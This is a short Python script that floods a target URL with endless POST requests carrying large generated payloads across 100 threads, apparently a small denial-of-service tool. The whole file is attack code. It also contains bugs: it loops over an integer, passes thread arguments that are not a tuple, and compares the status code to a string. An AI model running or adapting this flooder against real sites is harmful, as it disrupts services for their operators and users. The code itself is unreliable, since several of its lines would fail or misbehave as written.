import requests
import main
import threading


def test(url):
    print(
        """
        Flood mode doesn't display send info
        100 threads wills
        """
    )
    r = requests.post(url=url, allow_redirects=False, data=main.dataGen(10))
    if r.status_code == "404":
        print("URL not found")
    else:
        threads = list()
        for i in 100:
            send = threading.Thread(target=flood, args=(url))
            threads.append(send)
            send.start()
            
        

def flood(url):
    while True:
        r = requests.post(url=url, allow_redirects=False, data=main.dataGen(100000))
